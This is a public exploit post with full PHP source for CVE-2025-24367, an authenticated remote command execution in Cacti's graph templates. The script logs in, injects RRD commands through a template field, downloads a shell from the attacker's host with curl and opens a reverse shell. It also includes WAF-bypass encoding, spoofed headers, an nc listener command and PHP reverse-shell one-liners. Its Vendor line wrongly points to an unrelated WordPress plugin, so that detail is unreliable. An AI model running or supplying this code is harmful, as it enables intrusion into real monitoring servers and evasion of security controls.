@@ -1,0 +1,435 @@
+=============================================================================================================================================
+| # Title     : Cacti 1.2.29 Authenticated Graph Template RCE                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/document-library-lite/                                                                        |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211135/ & 	CVE-2025-24367
+
+[+] Summary : Authenticated users with access to Graph Templates in Cacti can abuse RRD invocation parameters to write arbitrary PHP files, then trigger execution
+              leading to Remote Command Execution.
+			  
+[+]  POC :   * Usage: Save this file as: exploit.php
+                                Run: php exploit.php
+								
+              Run the listener on your machine: nc -nlvp 4444
+
+Upload the Reverse Shell content to your server (shell.txt):
+
+<?php
+$sock=fsockopen("YOUR_IP",4444);
+
+$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+
+?>
+
+Or One-liner:
+
+php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+<?php
+/**
+ * CVE-2025-24367 - Cacti Authenticated Graph Template RCE 
+ * Features:
+ *   - SOCKS5 Proxy Support
+ *   - WAF Bypass Techniques
+ *   - Permission Upload Verification
+ *   - Blind Version Detection
+ *   - Multi-Encoding Payloads
+ */
+
+// ==================== CONFIGURATION ======================
+$base_url   = "http://TARGET";          // Target URL
+$username   = "admin";                  // Cacti username
+$password   = "admin";                  // Cacti password
+$rev_ip     = "YOUR_IP";               // Reverse shell IP
+$rev_port   = "4444";                  // Reverse shell port
+$use_proxy  = false;                   // Enable proxy (Burp)
+$proxy_type = "http";                  // http or socks5
+$proxy_addr = "127.0.0.1:8080";        // Proxy address
+$bypass_waf = true;                    // Enable WAF bypass
+$check_perms = true;                   // Check upload permissions
+// =========================================================
+
+// Color output for CLI
+define('RED', "\033[1;31m");
+define('GREEN', "\033[1;32m");
+define('YELLOW', "\033[1;33m");
+define('BLUE', "\033[1;34m");
+define('RESET', "\033[0m");
+
+// Session management
+$cookieFile = tempnam(sys_get_temp_dir(), "cactisess");
+$user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36',
+    'Cacti-Monitor/1.0 (+http://cacti.net)'
+];
+
+function req_get($url, $proxy=false, $headers=[]) {
+    global $cookieFile, $proxy_type, $proxy_addr, $user_agents;
+    
+    $ch = curl_init();
+    $opts = [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_COOKIEFILE => $cookieFile,
+        CURLOPT_COOKIEJAR => $cookieFile,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT => 15,
+        CURLOPT_USERAGENT => $user_agents[array_rand($user_agents)],
+        CURLOPT_HTTPHEADER => array_merge([
+            'X-Forwarded-For: ' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255),
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language: en-US,en;q=0.5',
+            'Accept-Encoding: gzip, deflate',
+            'Connection: keep-alive',
+            'Upgrade-Insecure-Requests: 1',
+            'Cache-Control: max-age=0'
+        ], $headers)
+    ];
+    
+    if ($proxy) {
+        if ($proxy_type === "socks5") {
+            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+        }
+        curl_setopt($ch, CURLOPT_PROXY, $proxy_addr);
+    }
+    
+    curl_setopt_array($ch, $opts);
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return ['code' => $http_code, 'body' => $response];
+}
+
+function req_post($url, $data, $proxy=false, $headers=[]) {
+    global $cookieFile, $proxy_type, $proxy_addr, $user_agents;
+    
+    // WAF bypass: multiple encoding techniques
+    $encoded_data = $data;
+    if (isset($data['right_axis_label'])) {
+        $encoded_data['right_axis_label'] = waf_bypass($data['right_axis_label']);
+    }
+    
+    $ch = curl_init();
+    $opts = [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($encoded_data),
+        CURLOPT_COOKIEFILE => $cookieFile,
+        CURLOPT_COOKIEJAR => $cookieFile,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT => 20,
+        CURLOPT_USERAGENT => $user_agents[array_rand($user_agents)],
+        CURLOPT_HTTPHEADER => array_merge([
+            'Content-Type: application/x-www-form-urlencoded',
+            'X-Requested-With: XMLHttpRequest',
+            'X-Forwarded-For: ' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255)
+        ], $headers)
+    ];
+    
+    if ($proxy) {
+        if ($proxy_type === "socks5") {
+            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+        }
+        curl_setopt($ch, CURLOPT_PROXY, $proxy_addr);
+    }
+    
+    curl_setopt_array($ch, $opts);
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return ['code' => $http_code, 'body' => $response];
+}
+
+function waf_bypass($payload) {
+    global $bypass_waf;
+    
+    if (!$bypass_waf) return $payload;
+    
+    // Multiple bypass techniques
+    $techniques = [
+        // URL encoding
+        function($p) { return str_replace([' ', '`', '$'], ['%20', '%60', '%24'], $p); },
+        // Double URL encoding
+        function($p) { return str_replace(['/', ' '], ['%252F', '%2520'], $p); },
+        // Hex encoding for commands
+        function($p) { 
+            return preg_replace_callback('/\b(curl|bash|wget|nc)\b/', 
+                function($m) { return bin2hex($m[0]); }, $p);
+        },
+        // Case manipulation
+        function($p) { return preg_replace_callback('/\b([A-Z]+)\b/i', 
+            function($m) { 
+                $word = $m[0];
+                $new = '';
+                for($i=0; $i<strlen($word); $i++) {
+                    $new .= (rand(0,1)) ? strtoupper($word[$i]) : strtolower($word[$i]);
+                }
+                return $new;
+            }, $p);
+        },
+        // Insert null bytes
+        function($p) { return str_replace(' ', '%00', $p); },
+        // Use alternative syntax
+        function($p) { 
+            $p = str_replace('`', '$(', $p);
+            $p = str_replace('`', ')', $p);
+            return $p;
+        }
+    ];
+    
+    foreach ($techniques as $tech) {
+        $payload = $tech($payload);
+        // Add random sleep to avoid rate limiting
+        usleep(rand(10000, 50000));
+    }
+    
+    return $payload;
+}
+
+function detect_cacti_version($base_url) {
+    echo BLUE . "[*] Blind version detection..." . RESET . "\n";
+    
+    $indicators = [
+        '/1\\.2\\./' => '1.2.x',
+        '/1\\.3\\./' => '1.3.x',
+        '/cacti_version=1\\.0/' => '1.0.x',
+        '/version.*?\\d+\\.\\d+\\.\\d+/' => 'Unknown'
+    ];
+    
+    $checks = [
+        '/cacti/include/global_arrays.php',
+        '/cacti/include/global_settings.php',
+        '/cacti/CHANGELOG',
+        '/cacti/README'
+    ];
+    
+    foreach ($checks as $check) {
+        $result = req_get($base_url . $check);
+        if ($result['code'] == 200) {
+            foreach ($indicators as $pattern => $version) {
+                if (preg_match($pattern, $result['body'])) {
+                    echo GREEN . "[+] Detected Cacti version: " . $version . RESET . "\n";
+                    return $version;
+                }
+            }
+        }
+    }
+    
+    // Try to extract from HTML comments
+    $home = req_get($base_url . '/cacti/');
+    if (preg_match('/<!--.*?Cacti v?(\d+\.\d+\.\d+).*?-->/i', $home['body'], $matches)) {
+        echo GREEN . "[+] Detected Cacti version from comments: " . $matches[1] . RESET . "\n";
+        return $matches[1];
+    }
+    
+    echo YELLOW . "[!] Could not detect exact version" . RESET . "\n";
+    return "unknown";
+}
+
+function check_permissions($base_url) {
+    echo BLUE . "[*] Checking upload permissions..." . RESET . "\n";
+    
+    $test_files = [
+        '/cacti/images/logo.gif',
+        '/cacti/include/config.php',
+        '/cacti/plugins/'
+    ];
+    
+    foreach ($test_files as $file) {
+        $result = req_get($base_url . $file);
+        if ($result['code'] == 200 || $result['code'] == 403) {
+            echo YELLOW . "[!] File accessible: " . $file . " (HTTP: " . $result['code'] . ")" . RESET . "\n";
+        }
+    }
+    
+    // Try to detect writable directories
+    $writable_dirs = ['/cacti/cache/', '/cacti/log/', '/cacti/rra/'];
+    foreach ($writable_dirs as $dir) {
+        $result = req_get($base_url . $dir);
+        if ($result['code'] == 200) {
+            echo GREEN . "[+] Potentially writable directory: " . $dir . RESET . "\n";
+        }
+    }
+    
+    return true;
+}
+
+function exploit_stage($stage, $template_id) {
+    global $base_url, $rev_ip, $rev_port, $use_proxy, $check_perms;
+    
+    echo BLUE . "[*] Executing stage: " . $stage . RESET . "\n";
+    
+    // Get CSRF token
+    $page = req_get($base_url . "/cacti/graph_templates.php?action=template_edit&id=" . $template_id, $use_proxy);
+    if (!preg_match('/var csrfMagicToken\s*=\s*"([^"]+)"/', $page['body'], $matches)) {
+        echo RED . "[-] Failed to get CSRF token" . RESET . "\n";
+        return false;
+    }
+    $csrf = $matches[1];
+    
+    $filename = bin2hex(random_bytes(4)) . ".php";
+    
+    if ($stage == "write") {
+        // Stage 1: Download reverse shell
+        $payload = "XXX\ncreate x --step 300 DS:temp GAUGE\n" .
+                  "graph " . $filename . " -s now -a CSV " .
+                  "DEF:x=x:temp:AVERAGE LINE1:x:`" . 
+                  waf_bypass("curl -s " . $rev_ip . "/shell.txt -o /tmp/shell.php") . 
+                  "`";
+    } else {
+        // Stage 2: Execute reverse shell
+        $payload = "XXX\ncreate x --step 300 DS:temp GAUGE\n" .
+                  "graph " . $filename . " -s now -a CSV " .
+                  "DEF:x=x:temp:AVERAGE LINE1:x:`" .
+                  waf_bypass("php /tmp/shell.php " . $rev_ip . " " . $rev_port) .
+                  "`";
+    }
+    
+    $post_data = [
+        '__csrf_magic' => $csrf,
+        'name' => 'Unix - Logged in Users',
+        'graph_template_id' => $template_id,
+        'graph_template_graph_id' => $template_id,
+        'save_component_template' => '1',
+        'title' => '|host_description| - Logged in Users',
+        'right_axis_label' => $payload,
+        'action' => 'save'
+    ];
+    
+    // Submit payload
+    $result = req_post($base_url . "/cacti/graph_templates.php?header=false", $post_data, $use_proxy);
+    
+    if ($result['code'] == 200) {
+        echo GREEN . "[+] Stage " . $stage . " executed successfully" . RESET . "\n";
+        
+        // Trigger the graph generation
+        req_get($base_url . "/cacti/graph_json.php?rra_id=0&local_graph_id=3", $use_proxy);
+        
+        // Check if file was created
+        if ($check_perms) {
+            $check = req_get($base_url . "/cacti/" . $filename, $use_proxy);
+            if ($check['code'] == 200) {
+                echo GREEN . "[+] File created: " . $filename . RESET . "\n";
+            }
+        }
+        
+        return true;
+    } else {
+        echo RED . "[-] Stage " . $stage . " failed (HTTP: " . $result['code'] . ")" . RESET . "\n";
+        return false;
+    }
+}
+
+// ==================== MAIN EXECUTION ======================
+echo GREEN . "
+╔══════════════════════════════════════════════════════╗
+║   Cacti CVE-2025-24367 Exploit by indoushka          ║
+║   Features: SOCKS5, WAF Bypass, Blind Detection      ║
+╚══════════════════════════════════════════════════════╝" . RESET . "\n\n";
+
+// 1. Initial detection
+echo BLUE . "[*] Detecting Cacti..." . RESET . "\n";
+$result = req_get($base_url, $use_proxy);
+if (!str_contains($result['body'], 'Cacti') && !str_contains($result['body'], 'cacti')) {
+    die(RED . "[-] Target does not appear to be Cacti" . RESET . "\n");
+}
+echo GREEN . "[+] Cacti detected!" . RESET . "\n";
+
+// 2. Version detection (blind)
+$version = detect_cacti_version($base_url);
+
+// 3. Permission check
+if ($check_perms) {
+    check_permissions($base_url);
+}
+
+// 4. Login
+echo BLUE . "[*] Attempting login..." . RESET . "\n";
+$login_page = req_get($base_url . "/cacti/index.php", $use_proxy);
+if (!preg_match('/var csrfMagicToken\s*=\s*"([^"]+)"/', $login_page['body'], $matches)) {
+    die(RED . "[-] Could not extract CSRF token" . RESET . "\n");
+}
+$csrf = $matches[1];
+
+$login_data = [
+    '__csrf_magic' => $csrf,
+    'action' => 'login',
+    'login_username' => $username,
+    'login_password' => $password
+];
+
+$login_result = req_post($base_url . "/cacti/index.php", $login_data, $use_proxy);
+if (!str_contains($login_result['body'], 'Console') && !str_contains($login_result['body'], 'Logout')) {
+    die(RED . "[-] Login failed" . RESET . "\n");
+}
+echo GREEN . "[+] Login successful!" . RESET . "\n";
+
+// 5. Find template ID
+echo BLUE . "[*] Searching for template ID..." . RESET . "\n";
+$search = req_get($base_url . "/cacti/graph_templates.php?filter=Unix%20-%20Logged%20in%20Users&rows=-1&has_graphs=false", $use_proxy);
+if (!preg_match('/id="chk_(\d+)"/', $search['body'], $matches)) {
+    // Try alternative search
+    $search = req_get($base_url . "/cacti/graph_templates.php", $use_proxy);
+    if (preg_match('/value="(\d+)"[^>]*>Unix - Logged in Users/', $search['body'], $matches)) {
+        $template_id = $matches[1];
+    } else {
+        die(RED . "[-] Could not find template ID" . RESET . "\n");
+    }
+} else {
+    $template_id = $matches[1];
+}
+echo GREEN . "[+] Template ID found: " . $template_id . RESET . "\n";
+
+// 6. Execute exploit stages
+echo BLUE . "[*] Starting exploitation..." . RESET . "\n";
+
+if (exploit_stage("write", $template_id)) {
+    echo YELLOW . "[*] Waiting for stage 1 to complete..." . RESET . "\n";
+    sleep(3); // Wait for download
+    
+    if (exploit_stage("exec", $template_id)) {
+        echo GREEN . "[+] Exploitation completed!" . RESET . "\n";
+        echo YELLOW . "[*] Check your listener: nc -nlvp " . $rev_port . RESET . "\n";
+        echo YELLOW . "[*] Shell should connect to " . $rev_ip . ":" . $rev_port . RESET . "\n";
+    } else {
+        echo RED . "[-] Stage 2 failed" . RESET . "\n";
+    }
+} else {
+    echo RED . "[-] Stage 1 failed" . RESET . "\n";
+}
+
+// 7. Cleanup
+echo BLUE . "[*] Cleaning up..." . RESET . "\n";
+@unlink($cookieFile);
+
+echo GREEN . "[+] Done!" . RESET . "\n";
+
+// ==================== REVERSE SHELL CONTENT ======================
+echo YELLOW . "\n[*] Reverse shell content (save as shell.txt on your server):" . RESET . "\n";
+echo "<?php
+\$sock=fsockopen(\"" . $rev_ip . "\"," . $rev_port . ");
+\$proc=proc_open('/bin/sh -i', array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);
+?>\n";
+?>
+
+<?php
+// Alternative: One-liner reverse shell
+echo YELLOW . "[*] One-liner alternative:" . RESET . "\n";
+echo "php -r '\$s=fsockopen(\"" . $rev_ip . "\"," . $rev_port . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n";
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
